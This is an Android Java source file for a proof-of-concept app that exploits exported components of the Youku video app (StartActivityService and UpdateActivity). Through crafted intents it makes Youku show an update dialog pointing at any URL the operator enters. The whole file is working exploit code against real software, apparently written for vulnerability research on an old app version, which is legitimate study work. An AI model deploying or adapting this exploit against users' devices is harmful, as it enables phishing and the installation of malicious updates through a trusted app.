package com.example.componentsvulns.youkupoc;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.youku.service.push.PushMsg;

/**
 * 优酷 StartActivityService / UpdateActivity 组件滥用验证端。
 */
public class YoukuPocMainActivity extends Activity {

    private EditText urlField;
    private EditText versionField;
    private EditText contentField;
    private TextView resultView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_youku_poc_main);

        urlField = findViewById(R.id.url);
        versionField = findViewById(R.id.version);
        contentField = findViewById(R.id.content);
        resultView = findViewById(R.id.result);

        urlField.setText(getString(R.string.default_url));
        versionField.setText(getString(R.string.default_version));
        contentField.setText(getString(R.string.default_content));

        Button sendService = findViewById(R.id.send_service);
        Button sendActivity = findViewById(R.id.send_activity);
        sendService.setOnClickListener(v -> fireViaService());
        sendActivity.setOnClickListener(v -> fireViaActivity());
    }

    private void fireViaService() {
        if (!ensureYoukuInstalled()) {
            return;
        }
        String url = text(urlField);
        String version = text(versionField);
        String content = text(contentField);
        if (url.isEmpty()) {
            toast("请填写 updateurl");
            return;
        }

        PushMsg pushMsg = PushMsg.updatePush(url, version, content);
        Intent intent = new Intent();
        intent.setComponent(YoukuTargets.START_ACTIVITY_SERVICE);
        intent.putExtra(YoukuTargets.EXTRA_PUSH_MSG, pushMsg);

        try {
            ComponentName started = startService(intent);
            String message = started == null
                    ? "startService 返回 null。目标进程可能未安装、被系统拒绝，或 Service 不存在。"
                    : "已调用 startService：\n" + started.flattenToShortString()
                            + "\n\n若序列化兼容，优酷应弹出 UpdateActivity 更新对话框。"
                            + "\nextra PushMsg.type=" + pushMsg.type
                            + "\nupdateurl=" + url;
            showResult(message);
        } catch (RuntimeException exception) {
            showResult(exception.getClass().getSimpleName() + "：\n" + exception.getMessage());
        }
    }

    private void fireViaActivity() {
        if (!ensureYoukuInstalled()) {
            return;
        }
        String url = text(urlField);
        String version = text(versionField);
        String content = text(contentField);
        if (url.isEmpty()) {
            toast("请填写 updateurl");
            return;
        }

        Intent intent = new Intent();
        intent.setComponent(YoukuTargets.UPDATE_ACTIVITY);
        intent.putExtra(YoukuTargets.KEY_URL, url);
        intent.putExtra(YoukuTargets.KEY_NEW_VERSION, version);
        intent.putExtra(YoukuTargets.KEY_CONTENT, content);
        intent.putExtra(YoukuTargets.KEY_UPDATE_TYPE, YoukuTargets.UPDATE_TYPE_PUSH);

        try {
            startActivity(intent);
            showResult("已 startActivity → UpdateActivity\nupdateurl=" + url);
        } catch (RuntimeException exception) {
            showResult(exception.getClass().getSimpleName() + "：\n" + exception.getMessage());
        }
    }

    private boolean ensureYoukuInstalled() {
        try {
            getPackageManager().getPackageInfo(YoukuTargets.PACKAGE, 0);
            return true;
        } catch (PackageManager.NameNotFoundException exception) {
            showResult("未安装 " + YoukuTargets.PACKAGE + "。请先安装 youku-v4.5 等目标 APK。");
            toast("未检测到优酷客户端");
            return false;
        }
    }

    private static String text(EditText field) {
        return field.getText() == null ? "" : field.getText().toString().trim();
    }

    private void showResult(String message) {
        resultView.setText(message);
    }

    private void toast(String message) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show();
    }
}
